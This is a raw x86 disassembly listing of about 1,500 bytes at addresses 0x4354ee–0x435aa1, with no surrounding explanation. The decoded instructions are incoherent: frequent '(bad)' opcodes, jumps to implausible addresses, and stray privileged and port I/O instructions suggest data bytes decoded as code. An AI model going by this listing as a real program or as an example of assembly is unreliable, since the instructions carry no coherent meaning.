  4354ee:	36 ea d4 29 39 8a 64 	ss ljmp $0x864,$0x8a3929d4
  4354f5:	08 
  4354f6:	98                   	cwtl
  4354f7:	e8 b9 33 23 3e       	call   0x3e6688b5
  4354fc:	e8 a4 95 14 fe       	call   0xfe57eaa5
  435501:	95                   	xchg   %eax,%ebp
  435502:	e9 5f a7 df 49       	jmp    0x4a22fc66
  435507:	57                   	push   %edi
  435508:	75 1a                	jne    0x435524
  43550a:	f8                   	clc
  43550b:	c3                   	ret
  43550c:	30 d2                	xor    %dl,%dl
  43550e:	5f                   	pop    %edi
  43550f:	80 07 6d             	addb   $0x6d,(%edi)
  435512:	be 97 2d ef 6d       	mov    $0x6def2d97,%esi
  435517:	fe                   	(bad)
  435518:	33 59 c1             	xor    -0x3f(%ecx),%ebx
  43551b:	2f                   	das
  43551c:	e4 6f                	in     $0x6f,%al
  43551e:	b0 e9                	mov    $0xe9,%al
  435520:	b2 3c                	mov    $0x3c,%dl
  435522:	d9 8f 25 4b 6c 8f    	(bad) -0x7093b4db(%edi)
  435528:	01 3f                	add    %edi,(%edi)
  43552a:	a8 5c                	test   $0x5c,%al
  43552c:	98                   	cwtl
  43552d:	80 eb 0d             	sub    $0xd,%bl
  435530:	e9 09 7b d1 ce       	jmp    0xcf14d03e
  435535:	47                   	inc    %edi
  435536:	9e                   	sahf
  435537:	82 3d c7 fb db 82 48 	cmpb   $0x48,0x82dbfbc7
  43553e:	c9                   	leave
  43553f:	f9                   	stc
  435540:	6e                   	outsb  %ds:(%esi),(%dx)
  435541:	37                   	aaa
  435542:	ac                   	lods   %ds:(%esi),%al
  435543:	8c 04 47             	mov    %es,(%edi,%eax,2)
  435546:	5f                   	pop    %edi
  435547:	0e                   	push   %cs
  435548:	18 eb                	sbb    %ch,%bl
  43554a:	f4                   	hlt
  43554b:	3b 4a 4d             	cmp    0x4d(%edx),%ecx
  43554e:	7d fe                	jge    0x43554e
  435550:	7f d5                	jg     0x435527
  435552:	5e                   	pop    %esi
  435553:	73 08                	jae    0x43555d
  435555:	1c d3                	sbb    $0xd3,%al
  435557:	76 fc                	jbe    0x435555
  435559:	fd                   	std
  43555a:	87 70 79             	xchg   %esi,0x79(%eax)
  43555d:	88 ed                	mov    %ch,%ch
  43555f:	f7 93 6a b5 54 e3    	notl   -0x1cab4a96(%ebx)
  435565:	2e 8d a6 11 af 5d 16 	lea    %cs:0x165daf11(%esi),%esp
  43556c:	de 57 e1             	ficoms -0x1f(%edi)
  43556f:	c8 90 d6 eb          	enter  $0xd690,$0xeb
  435573:	95                   	xchg   %eax,%ebp
  435574:	b8 7e 5b 99 f9       	mov    $0xf9995b7e,%eax
  435579:	bb 47 5a 59 23       	mov    $0x23595a47,%ebx
  43557e:	72 44                	jb     0x4355c4
  435580:	4c                   	dec    %esp
  435581:	ba 29 b1 31 fd       	mov    $0xfd31b129,%edx
  435586:	34 61                	xor    $0x61,%al
  435588:	3e c0 5f 6a ec       	rcrb   $0xec,%ds:0x6a(%edi)
  43558d:	e0 67                	loopne 0x4355f6
  43558f:	28 4c 2d 79          	sub    %cl,0x79(%ebp,%ebp,1)
  435593:	08 4c a9 58          	or     %cl,0x58(%ecx,%ebp,4)
  435597:	de d4                	(bad)
  435599:	4f                   	dec    %edi
  43559a:	04 e0                	add    $0xe0,%al
  43559c:	1d da f8 9c 1f       	sbb    $0x1f9cf8da,%eax
  4355a1:	fb                   	sti
  4355a2:	88 a3 fd 14 26 6b    	mov    %ah,0x6b2614fd(%ebx)
  4355a8:	69 20 a3 73 05 1b    	imul   $0x1b0573a3,(%eax),%esp
  4355ae:	9b                   	fwait
  4355af:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4355b0:	c5 51 0e             	lds    0xe(%ecx),%edx
  4355b3:	36 f5                	ss cmc
  4355b5:	4e                   	dec    %esi
  4355b6:	6d                   	insl   (%dx),%es:(%edi)
  4355b7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4355b8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4355b9:	7d 88                	jge    0x435543
  4355bb:	2d 56 14 ee 25       	sub    $0x25ee1456,%eax
  4355c0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4355c1:	33 6e 9f             	xor    -0x61(%esi),%ebp
  4355c4:	c2 45 5b             	ret    $0x5b45
  4355c7:	5b                   	pop    %ebx
  4355c8:	34 01                	xor    $0x1,%al
  4355ca:	d5 72                	aad    $0x72
  4355cc:	70 1d                	jo     0x4355eb
  4355ce:	54                   	push   %esp
  4355cf:	26 98                	es cwtl
  4355d1:	c8 ff 29 b5          	enter  $0x29ff,$0xb5
  4355d5:	9b                   	fwait
  4355d6:	f1                   	int1
  4355d7:	e0 f6                	loopne 0x4355cf
  4355d9:	4e                   	dec    %esi
  4355da:	40                   	inc    %eax
  4355db:	ec                   	in     (%dx),%al
  4355dc:	fa                   	cli
  4355dd:	26 b8 44 9e 23 8c    	es mov $0x8c239e44,%eax
  4355e3:	75 de                	jne    0x4355c3
  4355e5:	da 4c 7d d3          	fimull -0x2d(%ebp,%edi,2)
  4355e9:	c8 72 f5 21          	enter  $0xf572,$0x21
  4355ed:	0f a1                	pop    %fs
  4355ef:	d6                   	salc
  4355f0:	c2 7f 64             	ret    $0x647f
  4355f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4355f4:	9f                   	lahf
  4355f5:	28 ef                	sub    %ch,%bh
  4355f7:	4f                   	dec    %edi
  4355f8:	f7 21                	mull   (%ecx)
  4355fa:	cb                   	lret
  4355fb:	80 68 de b9          	subb   $0xb9,-0x22(%eax)
  4355ff:	95                   	xchg   %eax,%ebp
  435600:	79 f8                	jns    0x4355fa
  435602:	34 2a                	xor    $0x2a,%al
  435604:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435605:	60                   	pusha
  435606:	eb 2a                	jmp    0x435632
  435608:	11 7d 56             	adc    %edi,0x56(%ebp)
  43560b:	ee                   	out    %al,(%dx)
  43560c:	ad                   	lods   %ds:(%esi),%eax
  43560d:	d2 fd                	sar    %cl,%ch
  43560f:	fd                   	std
  435610:	b5 e8                	mov    $0xe8,%ch
  435612:	05 ab 6b 62 6b       	add    $0x6b626bab,%eax
  435617:	0b e8                	or     %eax,%ebp
  435619:	04 16                	add    $0x16,%al
  43561b:	bf 71 30 ea 20       	mov    $0x20ea3071,%edi
  435620:	a2 17 7a 86 32       	mov    %al,0x32867a17
  435625:	4a                   	dec    %edx
  435626:	ee                   	out    %al,(%dx)
  435627:	99                   	cltd
  435628:	81 8a 74 fa f3 bc 2f 	orl    $0xd9d4352f,-0x430c058c(%edx)
  43562f:	35 d4 d9 
  435632:	2a c2                	sub    %dl,%al
  435634:	48                   	dec    %eax
  435635:	5a                   	pop    %edx
  435636:	83 9e 1a 96 89 38 04 	sbbl   $0x4,0x3889961a(%esi)
  43563d:	9b                   	fwait
  43563e:	25 07 54 7d 03       	and    $0x37d5407,%eax
  435643:	35 f9 99 57 2d       	xor    $0x2d5799f9,%eax
  435648:	32 97 9d 1c c3 db    	xor    -0x243ce363(%edi),%dl
  43564e:	05 a9 3d 08 0f       	add    $0xf083da9,%eax
  435653:	86 76 18             	xchg   %dh,0x18(%esi)
  435656:	77 cf                	ja     0x435627
  435658:	66 fd                	data16 std
  43565a:	94                   	xchg   %eax,%esp
  43565b:	f4                   	hlt
  43565c:	e4 a9                	in     $0xa9,%al
  43565e:	d8 67 38             	fsubs  0x38(%edi)
  435661:	45                   	inc    %ebp
  435662:	11 e5                	adc    %esp,%ebp
  435664:	48                   	dec    %eax
  435665:	47                   	inc    %edi
  435666:	d5 08                	aad    $0x8
  435668:	9b da 30             	fidivl (%eax)
  43566b:	65 66 e4 09          	gs data16 in $0x9,%al
  43566f:	99                   	cltd
  435670:	f2 44                	repnz inc %esp
  435672:	cc                   	int3
  435673:	ba d9 d7 0a 92       	mov    $0x920ad7d9,%edx
  435678:	92                   	xchg   %eax,%edx
  435679:	e6 7e                	out    %al,$0x7e
  43567b:	e4 dd                	in     $0xdd,%al
  43567d:	fa                   	cli
  43567e:	1e                   	push   %ds
  43567f:	cc                   	int3
  435680:	fb                   	sti
  435681:	8a fb                	mov    %bl,%bh
  435683:	f0 15 de ae d5 10    	lock adc $0x10d5aede,%eax
  435689:	36 a9 2a 29 d3 68    	ss test $0x68d3292a,%eax
  43568f:	83 61 16 34          	andl   $0x34,0x16(%ecx)
  435693:	0b 77 2e             	or     0x2e(%edi),%esi
  435696:	4b                   	dec    %ebx
  435697:	76 5f                	jbe    0x4356f8
  435699:	c6                   	(bad)
  43569a:	f9                   	stc
  43569b:	e9 45 f8 41 77       	jmp    0x77854ee5
  4356a0:	11 b1 a2 9f 3b e2    	adc    %esi,-0x1dc4605e(%ecx)
  4356a6:	6a c6                	push   $0xffffffc6
  4356a8:	29 9b 15 f2 d0 52    	sub    %ebx,0x52d0f215(%ebx)
  4356ae:	f8                   	clc
  4356af:	18 87 b8 dc ab 2f    	sbb    %al,0x2fabdcb8(%edi)
  4356b5:	30 00                	xor    %al,(%eax)
  4356b7:	cb                   	lret
  4356b8:	04 9a                	add    $0x9a,%al
  4356ba:	e5 69                	in     $0x69,%eax
  4356bc:	bb c6 35 dd 88       	mov    $0x88dd35c6,%ebx
  4356c1:	70 65                	jo     0x435728
  4356c3:	a8 44                	test   $0x44,%al
  4356c5:	3b b0 19 f1 51 be    	cmp    -0x41ae0ee7(%eax),%esi
  4356cb:	52                   	push   %edx
  4356cc:	c7                   	(bad)
  4356cd:	24 53                	and    $0x53,%al
  4356cf:	83 34 74 68          	xorl   $0x68,(%esp,%esi,2)
  4356d3:	dd ec                	fucomp %st(4)
  4356d5:	70 44                	jo     0x43571b
  4356d7:	59                   	pop    %ecx
  4356d8:	b8 99 05 73 04       	mov    $0x4730599,%eax
  4356dd:	32 40 26             	xor    0x26(%eax),%al
  4356e0:	bf 26 52 e6 b3       	mov    $0xb3e65226,%edi
  4356e5:	3e 69 61 13 65 6a ed 	imul   $0xa9ed6a65,%ds:0x13(%ecx),%esp
  4356ec:	a9 
  4356ed:	83 66 26 34          	andl   $0x34,0x26(%esi)
  4356f1:	9c                   	pushf
  4356f2:	d5 ec                	aad    $0xec
  4356f4:	2e 71 db             	jno,pn 0x4356d2
  4356f7:	bc 7a ab fd 50       	mov    $0x50fdab7a,%esp
  4356fc:	16                   	push   %ss
  4356fd:	ca 1c 64             	lret   $0x641c
  435700:	d0 d3                	rcl    $1,%bl
  435702:	62 a0 e0 d9 8f 72    	bound  %esp,0x728fd9e0(%eax)
  435708:	29 90 09 1f 58 42    	sub    %edx,0x42581f09(%eax)
  43570e:	df c3                	ffreep %st(3)
  435710:	64 7f d5             	fs jg  0x4356e8
  435713:	43                   	inc    %ebx
  435714:	0b cf                	or     %edi,%ecx
  435716:	63 2a                	arpl   %ebp,(%edx)
  435718:	bb d9 46 a2 e4       	mov    $0xe4a246d9,%ebx
  43571d:	f4                   	hlt
  43571e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  43571f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435720:	c8 df e7 2e          	enter  $0xe7df,$0x2e
  435724:	05 f3 d3 4c 71       	add    $0x714cd3f3,%eax
  435729:	79 51                	jns    0x43577c
  43572b:	b1 a3                	mov    $0xa3,%cl
  43572d:	7c d7                	jl     0x435706
  43572f:	24 1a                	and    $0x1a,%al
  435731:	88 d1                	mov    %dl,%cl
  435733:	7c e1                	jl     0x435716
  435735:	16                   	push   %ss
  435736:	cc                   	int3
  435737:	ff                   	lcall  (bad)
  435738:	d8 dc                	fcomp  %st(4)
  43573a:	90                   	nop
  43573b:	ab                   	stos   %eax,%es:(%edi)
  43573c:	c4 64 b9 18          	les    0x18(%ecx,%edi,4),%esp
  435740:	17                   	pop    %ss
  435741:	1b 6e 08             	sbb    0x8(%esi),%ebp
  435744:	71 d6                	jno    0x43571c
  435746:	c1 2b 79             	shrl   $0x79,(%ebx)
  435749:	50                   	push   %eax
  43574a:	61                   	popa
  43574b:	23 ca                	and    %edx,%ecx
  43574d:	62 1a                	bound  %ebx,(%edx)
  43574f:	47                   	inc    %edi
  435750:	7f d8                	jg     0x43572a
  435752:	62 b7 0b 82 ed 43    	bound  %esi,0x43ed820b(%edi)
  435758:	51                   	push   %ecx
  435759:	02 15 72 aa 70 07    	add    0x770aa72,%dl
  43575f:	c3                   	ret
  435760:	97                   	xchg   %eax,%edi
  435761:	34 fe                	xor    $0xfe,%al
  435763:	b9 8a 31 ae 8e       	mov    $0x8eae318a,%ecx
  435768:	e9 de 5d 30 ae       	jmp    0xae73b54b
  43576d:	59                   	pop    %ecx
  43576e:	1b 8e 5d 92 47 bb    	sbb    -0x44b86da3(%esi),%ecx
  435774:	c3                   	ret
  435775:	ff e2                	jmp    *%edx
  435777:	44                   	inc    %esp
  435778:	82 39 d8             	cmpb   $0xd8,(%ecx)
  43577b:	e5 a2                	in     $0xa2,%eax
  43577d:	21 3b                	and    %edi,(%ebx)
  43577f:	eb 21                	jmp    0x4357a2
  435781:	99                   	cltd
  435782:	ef                   	out    %eax,(%dx)
  435783:	e0 a4                	loopne 0x435729
  435785:	8e 21                	mov    (%ecx),%fs
  435787:	e7 84                	out    %eax,$0x84
  435789:	ff 61 c7             	jmp    *-0x39(%ecx)
  43578c:	c2 e8 de             	ret    $0xdee8
  43578f:	2f                   	das
  435790:	c2 1b 72             	ret    $0x721b
  435793:	bc ff b8 33 15       	mov    $0x1533b8ff,%esp
  435798:	2c 4f                	sub    $0x4f,%al
  43579a:	d9 d3                	(bad)
  43579c:	88 f9                	mov    %bh,%cl
  43579e:	e8 af e2 b6 78       	call   0x78fa3a52
  4357a3:	3a 6f 2c             	cmp    0x2c(%edi),%ch
  4357a6:	97                   	xchg   %eax,%edi
  4357a7:	a0 ae bd d3 fa       	mov    0xfad3bdae,%al
  4357ac:	69 8f cc 11 79 92 9e 	imul   $0x8915bf9e,-0x6d86ee34(%edi),%ecx
  4357b3:	bf 15 89 
  4357b6:	15 ab eb f9 1c       	adc    $0x1cf9ebab,%eax
  4357bb:	e9 0b 91 e9 5c       	jmp    0x5d2ce8cb
  4357c0:	4b                   	dec    %ebx
  4357c1:	89 77 46             	mov    %esi,0x46(%edi)
  4357c4:	c9                   	leave
  4357c5:	b5 db                	mov    $0xdb,%ch
  4357c7:	42                   	inc    %edx
  4357c8:	86 73 cd             	xchg   %dh,-0x33(%ebx)
  4357cb:	4b                   	dec    %ebx
  4357cc:	54                   	push   %esp
  4357cd:	fd                   	std
  4357ce:	d5 f4                	aad    $0xf4
  4357d0:	62 b4 b7 a5 42 47 af 	bound  %esi,-0x50b8bd5b(%edi,%esi,4)
  4357d7:	7a 84                	jp     0x43575d
  4357d9:	53                   	push   %ebx
  4357da:	f0 cb                	lock lret
  4357dc:	74 bb                	je     0x435799
  4357de:	52                   	push   %edx
  4357df:	50                   	push   %eax
  4357e0:	45                   	inc    %ebp
  4357e1:	6c                   	insb   (%dx),%es:(%edi)
  4357e2:	ab                   	stos   %eax,%es:(%edi)
  4357e3:	c7 02 68 b7 7e dd    	movl   $0xdd7eb768,(%edx)
  4357e9:	21 9e ab 85 6e 55    	and    %ebx,0x556e85ab(%esi)
  4357ef:	00 dd                	add    %bl,%ch
  4357f1:	59                   	pop    %ecx
  4357f2:	c1 f9 37             	sar    $0x37,%ecx
  4357f5:	60                   	pusha
  4357f6:	ac                   	lods   %ds:(%esi),%al
  4357f7:	cc                   	int3
  4357f8:	55                   	push   %ebp
  4357f9:	48                   	dec    %eax
  4357fa:	5d                   	pop    %ebp
  4357fb:	cf                   	iret
  4357fc:	50                   	push   %eax
  4357fd:	cb                   	lret
  4357fe:	1e                   	push   %ds
  4357ff:	e1 73                	loope  0x435874
  435801:	0d 81 2b ef be       	or     $0xbeef2b81,%eax
  435806:	6d                   	insl   (%dx),%es:(%edi)
  435807:	7f 02                	jg     0x43580b
  435809:	42                   	inc    %edx
  43580a:	dc ee                	fsubr  %st,%st(6)
  43580c:	d0 4e 15             	rorb   $1,0x15(%esi)
  43580f:	83 47 92 46          	addl   $0x46,-0x6e(%edi)
  435813:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435814:	4a                   	dec    %edx
  435815:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435816:	c6                   	(bad)
  435817:	a2 1c cb 2c b2       	mov    %al,0xb22ccb1c
  43581c:	c2 18 7d             	ret    $0x7d18
  43581f:	f1                   	int1
  435820:	d4 1c                	aam    $0x1c
  435822:	c5 bd e2 1b ab bf    	lds    -0x4054e41e(%ebp),%edi
  435828:	db 01                	fildl  (%ecx)
  43582a:	f3 10 58 00          	repz adc %bl,0x0(%eax)
  43582e:	c5 94 a0 f5 f3 7c 1b 	lds    0x1b7cf3f5(%eax,%eiz,4),%edx
  435835:	aa                   	stos   %al,%es:(%edi)
  435836:	f8                   	clc
  435837:	d2 09                	rorb   %cl,(%ecx)
  435839:	d6                   	salc
  43583a:	bc d4 f6 f5 2c       	mov    $0x2cf5f6d4,%esp
  43583f:	aa                   	stos   %al,%es:(%edi)
  435840:	dd a1 2d 08 5f 07    	frstor 0x75f082d(%ecx)
  435846:	31 a5 3f 42 7c 35    	xor    %esp,0x357c423f(%ebp)
  43584c:	d8 81 aa 83 0f cb    	fadds  -0x34f07c56(%ecx)
  435852:	1d 54 7d 65 fc       	sbb    $0xfc657d54,%eax
  435857:	68 99 89 63 f3       	push   $0xf3638999
  43585c:	2d d4 dc 7e 80       	sub    $0x807edcd4,%eax
  435861:	cc                   	int3
  435862:	64 ee                	fs out %al,(%dx)
  435864:	c1 12 32             	rcll   $0x32,(%edx)
  435867:	a3 04 5d c7 9f       	mov    %eax,0x9fc75d04
  43586c:	cd 41                	int    $0x41
  43586e:	de a0 17 60 53 9f    	fisubs -0x60ac9fe9(%eax)
  435874:	7e 08                	jle    0x43587e
  435876:	53                   	push   %ebx
  435877:	81 52 37 ec c7 0f fb 	adcl   $0xfb0fc7ec,0x37(%edx)
  43587e:	6f                   	outsl  %ds:(%esi),(%dx)
  43587f:	bd 59 54 16 49       	mov    $0x49165459,%ebp
  435884:	0c 4c                	or     $0x4c,%al
  435886:	1e                   	push   %ds
  435887:	c0 4a 15 41          	rorb   $0x41,0x15(%edx)
  43588b:	49                   	dec    %ecx
  43588c:	17                   	pop    %ss
  43588d:	14 11                	adc    $0x11,%al
  43588f:	17                   	pop    %ss
  435890:	8f                   	(bad)
  435891:	55                   	push   %ebp
  435892:	4e                   	dec    %esi
  435893:	2f                   	das
  435894:	e3 cc                	jecxz  0x435862
  435896:	ba e9 8f 83 1e       	mov    $0x1e838fe9,%edx
  43589b:	47                   	inc    %edi
  43589c:	78 f7                	js     0x435895
  43589e:	f0 2c 37             	lock sub $0x37,%al
  4358a1:	6c                   	insb   (%dx),%es:(%edi)
  4358a2:	e4 d7                	in     $0xd7,%al
  4358a4:	cb                   	lret
  4358a5:	69 9c 03 d3 de de cc 	imul   $0x70e3194,-0x3321212d(%ebx,%eax,1),%ebx
  4358ac:	94 31 0e 07 
  4358b0:	5a                   	pop    %edx
  4358b1:	df 02                	filds  (%edx)
  4358b3:	db 9e 91 9f ab 47    	fistpl 0x47ab9f91(%esi)
  4358b9:	1b 93 83 aa d9 5c    	sbb    0x5cd9aa83(%ebx),%edx
  4358bf:	e8 7a 2f 1f a3       	call   0xa362883e
  4358c4:	58                   	pop    %eax
  4358c5:	e7 ab                	out    %eax,$0xab
  4358c7:	03 08                	add    (%eax),%ecx
  4358c9:	1d 97 c4 39 35       	sbb    $0x3539c497,%eax
  4358ce:	c9                   	leave
  4358cf:	c3                   	ret
  4358d0:	b3 38                	mov    $0x38,%bl
  4358d2:	3d 92 31 71 da       	cmp    $0xda713192,%eax
  4358d7:	a2 07 0d b8 73       	mov    %al,0x73b80d07
  4358dc:	07                   	pop    %es
  4358dd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4358de:	28 19                	sub    %bl,(%ecx)
  4358e0:	0e                   	push   %cs
  4358e1:	55                   	push   %ebp
  4358e2:	22 7e 78             	and    0x78(%esi),%bh
  4358e5:	c9                   	leave
  4358e6:	7b 58                	jnp    0x435940
  4358e8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4358e9:	e9 f5 97 63 b3       	jmp    0xb3a6f0e3
  4358ee:	18 37                	sbb    %dh,(%edi)
  4358f0:	13 a2 99 90 5e 9d    	adc    -0x62a16f67(%edx),%esp
  4358f6:	5e                   	pop    %esi
  4358f7:	7e cc                	jle    0x4358c5
  4358f9:	10 38                	adc    %bh,(%eax)
  4358fb:	25 03 78 7f da       	and    $0xda7f7803,%eax
  435900:	25 a3 3f 9b fb       	and    $0xfb9b3fa3,%eax
  435905:	c3                   	ret
  435906:	5a                   	pop    %edx
  435907:	bc 85 85 16 48       	mov    $0x48168585,%esp
  43590c:	4a                   	dec    %edx
  43590d:	9a 3a 7e 44 1d f1 8f 	lcall  $0x8ff1,$0x1d447e3a
  435914:	cd 65                	int    $0x65
  435916:	e4 bf                	in     $0xbf,%al
  435918:	30 f2                	xor    %dh,%dl
  43591a:	12 17                	adc    (%edi),%dl
  43591c:	ef                   	out    %eax,(%dx)
  43591d:	e9 2d 51 1e a2       	jmp    0xa261aa4f
  435922:	69 d2 5e 7e 13 6c    	imul   $0x6c137e5e,%edx,%edx
  435928:	fd                   	std
  435929:	96                   	xchg   %eax,%esi
  43592a:	fe                   	(bad)
  43592b:	fa                   	cli
  43592c:	53                   	push   %ebx
  43592d:	36 a4                	movsb  %ss:(%esi),%es:(%edi)
  43592f:	07                   	pop    %es
  435930:	99                   	cltd
  435931:	77 2b                	ja     0x43595e
  435933:	61                   	popa
  435934:	8f                   	(bad)
  435935:	2e eb c1             	cs jmp 0x4358f9
  435938:	84 c1                	test   %al,%cl
  43593a:	d9 09                	(bad) (%ecx)
  43593c:	bc 11 cb 8e de       	mov    $0xde8ecb11,%esp
  435941:	07                   	pop    %es
  435942:	96                   	xchg   %eax,%esi
  435943:	07                   	pop    %es
  435944:	3a e0                	cmp    %al,%ah
  435946:	b9 93 58 44 b1       	mov    $0xb1445893,%ecx
  43594b:	08 1f                	or     %bl,(%edi)
  43594d:	3a d7                	cmp    %bh,%dl
  43594f:	66 04 09             	data16 add $0x9,%al
  435952:	5b                   	pop    %ebx
  435953:	00 99 f7 2f fc c0    	add    %bl,-0x3f03d009(%ecx)
  435959:	ac                   	lods   %ds:(%esi),%al
  43595a:	2b 4e 77             	sub    0x77(%esi),%ecx
  43595d:	e9 ec 4f 26 49       	jmp    0x4969a94e
  435962:	f6 8e 8c 14 9a f8 93 	testb  $0x93,-0x765eb74(%esi)
  435969:	2b e1                	sub    %ecx,%esp
  43596b:	6e                   	outsb  %ds:(%esi),(%dx)
  43596c:	26 c1 f2 68          	es shl $0x68,%edx
  435970:	c2 94 5c             	ret    $0x5c94
  435973:	46                   	inc    %esi
  435974:	a2 dd fc 8c 4b       	mov    %al,0x4b8cfcdd
  435979:	21 46 0f             	and    %eax,0xf(%esi)
  43597c:	ae                   	scas   %es:(%edi),%al
  43597d:	36 0c 49             	ss or  $0x49,%al
  435980:	7e dc                	jle    0x43595e
  435982:	d9 6f 84             	fldcw  -0x7c(%edi)
  435985:	76 f0                	jbe    0x435977
  435987:	af                   	scas   %es:(%edi),%eax
  435988:	7a 40                	jp     0x4359ca
  43598a:	b4 fd                	mov    $0xfd,%ah
  43598c:	ec                   	in     (%dx),%al
  43598d:	2b 08                	sub    (%eax),%ecx
  43598f:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435990:	ab                   	stos   %eax,%es:(%edi)
  435991:	60                   	pusha
  435992:	82 d8 b6             	sbb    $0xb6,%al
  435995:	f4                   	hlt
  435996:	71 27                	jno    0x4359bf
  435998:	23 ea                	and    %edx,%ebp
  43599a:	4b                   	dec    %ebx
  43599b:	5e                   	pop    %esi
  43599c:	71 63                	jno    0x435a01
  43599e:	9e                   	sahf
  43599f:	0b eb                	or     %ebx,%ebp
  4359a1:	dc 6c 5e fa          	fsubrl -0x6(%esi,%ebx,2)
  4359a5:	10 e4                	adc    %ah,%ah
  4359a7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4359a8:	11 b4 07 80 82 36 ad 	adc    %esi,-0x52c97d80(%edi,%eax,1)
  4359af:	52                   	push   %edx
  4359b0:	43                   	inc    %ebx
  4359b1:	75 4d                	jne    0x435a00
  4359b3:	98                   	cwtl
  4359b4:	aa                   	stos   %al,%es:(%edi)
  4359b5:	cf                   	iret
  4359b6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4359b7:	57                   	push   %edi
  4359b8:	1f                   	pop    %ds
  4359b9:	64 49                	fs dec %ecx
  4359bb:	54                   	push   %esp
  4359bc:	5d                   	pop    %ebp
  4359bd:	da 82 92 e2 07 62    	fiaddl 0x6207e292(%edx)
  4359c3:	4d                   	dec    %ebp
  4359c4:	71 61                	jno    0x435a27
  4359c6:	f6 60 53             	mulb   0x53(%eax)
  4359c9:	57                   	push   %edi
  4359ca:	cd 2b                	int    $0x2b
  4359cc:	a0 98 d3 67 42       	mov    0x4267d398,%al
  4359d1:	3e 44                	ds inc %esp
  4359d3:	a9 02 ae 08 3f       	test   $0x3f08ae02,%eax
  4359d8:	17                   	pop    %ss
  4359d9:	e2 b3                	loop   0x43598e
  4359db:	a3 dc a9 66 68       	mov    %eax,0x6866a9dc
  4359e0:	fc                   	cld
  4359e1:	fe                   	(bad)
  4359e2:	fe                   	(bad)
  4359e3:	de 82 4f e0 7d 47    	fiadds 0x477de04f(%edx)
  4359e9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4359ea:	19 5b ef             	sbb    %ebx,-0x11(%ebx)
  4359ed:	c5 fa c7             	(bad)
  4359f0:	29 ce                	sub    %ecx,%esi
  4359f2:	cd d4                	int    $0xd4
  4359f4:	7d 56                	jge    0x435a4c
  4359f6:	33 82 3b b6 ce be    	xor    -0x413149c5(%edx),%eax
  4359fc:	d3 82 b5 0d 70 ee    	roll   %cl,-0x118ff24b(%edx)
  435a02:	43                   	inc    %ebx
  435a03:	3e ef                	ds out %eax,(%dx)
  435a05:	fb                   	sti
  435a06:	dd 75 74             	fnsave 0x74(%ebp)
  435a09:	ed                   	in     (%dx),%eax
  435a0a:	c4                   	(bad)
  435a0b:	cf                   	iret
  435a0c:	62 13                	bound  %edx,(%ebx)
  435a0e:	54                   	push   %esp
  435a0f:	02 dc                	add    %ah,%bl
  435a11:	52                   	push   %edx
  435a12:	b9 5c 3a ab 3b       	mov    $0x3bab3a5c,%ecx
  435a17:	da b1 28 28 88 34    	fidivl 0x34882828(%ecx)
  435a1d:	85 a0 19 d2 d7 55    	test   %esp,0x55d7d219(%eax)
  435a23:	90                   	nop
  435a24:	21 88 f4 20 de bb    	and    %ecx,-0x4421df0c(%eax)
  435a2a:	60                   	pusha
  435a2b:	2d 84 36 77 cb       	sub    $0xcb773684,%eax
  435a30:	02 f1                	add    %cl,%dh
  435a32:	95                   	xchg   %eax,%ebp
  435a33:	d3 b7 58 6b 9a 67    	shll   %cl,0x679a6b58(%edi)
  435a39:	d5 32                	aad    $0x32
  435a3b:	b7 58                	mov    $0x58,%bh
  435a3d:	6e                   	outsb  %ds:(%esi),(%dx)
  435a3e:	38 c2                	cmp    %al,%dl
  435a40:	8e d6                	mov    %esi,%ss
  435a42:	8b bf 36 40 3b 37    	mov    0x373b4036(%edi),%edi
  435a48:	29 7a b1             	sub    %edi,-0x4f(%edx)
  435a4b:	80 cd b3             	or     $0xb3,%ch
  435a4e:	e5 25                	in     $0x25,%eax
  435a50:	4e                   	dec    %esi
  435a51:	d7                   	xlat   %ds:(%ebx)
  435a52:	95                   	xchg   %eax,%ebp
  435a53:	ec                   	in     (%dx),%al
  435a54:	21 b2 20 02 37 84    	and    %esi,-0x7bc8fde0(%edx)
  435a5a:	6b 09 12             	imul   $0x12,(%ecx),%ecx
  435a5d:	fb                   	sti
  435a5e:	45                   	inc    %ebp
  435a5f:	85 c8                	test   %ecx,%eax
  435a61:	56                   	push   %esi
  435a62:	2e b1 3e             	cs mov $0x3e,%cl
  435a65:	7b a2                	jnp    0x435a09
  435a67:	61                   	popa
  435a68:	3f                   	aas
  435a69:	37                   	aaa
  435a6a:	04 9d                	add    $0x9d,%al
  435a6c:	7f 71                	jg     0x435adf
  435a6e:	ad                   	lods   %ds:(%esi),%eax
  435a6f:	f8                   	clc
  435a70:	92                   	xchg   %eax,%edx
  435a71:	8c 6b 8b             	mov    %gs,-0x75(%ebx)
  435a74:	fd                   	std
  435a75:	9e                   	sahf
  435a76:	5c                   	pop    %esp
  435a77:	7f 02                	jg     0x435a7b
  435a79:	65 ec                	gs in  (%dx),%al
  435a7b:	cd 77                	int    $0x77
  435a7d:	a8 03                	test   $0x3,%al
  435a7f:	c6                   	(bad)
  435a80:	a9 b6 ca 96 43       	test   $0x4396cab6,%eax
  435a85:	e3 e2                	jecxz  0x435a69
  435a87:	0d 7f 47 9c a3       	or     $0xa39c477f,%eax
  435a8c:	e2 cf                	loop   0x435a5d
  435a8e:	ca 66 51             	lret   $0x5166
  435a91:	61                   	popa
  435a92:	9f                   	lahf
  435a93:	e6 5a                	out    %al,$0x5a
  435a95:	16                   	push   %ss
  435a96:	45                   	inc    %ebp
  435a97:	aa                   	stos   %al,%es:(%edi)
  435a98:	43                   	inc    %ebx
  435a99:	ca bb 9b             	lret   $0x9bbb
  435a9c:	31 40 fc             	xor    %eax,-0x4(%eax)
  435a9f:	54                   	push   %esp
  435aa0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435aa1:	b8 4b f1 f8 b4       	mov    $0xb4f8f14b,%eax
